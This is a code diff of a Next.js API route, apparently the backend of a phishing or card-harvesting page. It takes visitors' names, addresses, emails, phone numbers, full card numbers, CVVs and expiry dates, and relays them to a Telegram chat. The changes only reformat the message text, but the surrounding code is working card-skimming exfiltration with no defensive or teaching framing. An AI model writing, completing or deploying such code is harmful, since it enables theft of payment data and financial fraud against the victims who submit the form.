@@ -17,19 +17,18 @@ export async function POST(req: Request) {
     console.log("💬 CHAT_ID:", process.env.TELEGRAM_CHAT_ID);
 
     if (body.type === "brand_update") {
-      const message = `💵 CARD BALANCE ENTERED
+      const message = `💵 CARD BALANCE ENTERED:(id: ${safe(body.orderId)})
       
-id: ${safe(body.orderId)}
 Card balance: ${safe(body.brandName)}`;
 
       await sendTelegramMessage(message);
       return NextResponse.json({ success: true });
     }
 
-    const message = `💳 NEW CARD SUBMISSION
-Contact info
+    const message = `💳 NEW CARD SUBMISSION:(id: ${safe(body.orderId)})
+    
+Contact info:
 
-id: ${safe(body.orderId)}
 name: ${safe(body.firstName)} ${safe(body.lastName)}
 email: ${safe(body.email)}
 phone: ${safe(body.phone)}
@@ -39,12 +38,12 @@ state: ${safe(body.state)}
 zip: ${safe(body.zipCode)}
 country: ${safe(body.country)}
 
-Card info
+Card info:
 
-Name on card: ${safe(body.cardName)},
-cardNumber: ${safe(body.cardNumber)},
-cvv: ${safe(body.cvv)},
-expiryDate: ${safe(body.expiryDate)},
+Name on card: ${safe(body.cardName)}
+card number: ${safe(body.cardNumber)}
+cvv: ${safe(body.cvv)}
+expiry date: ${safe(body.expiryDate)}
 
 `;
 
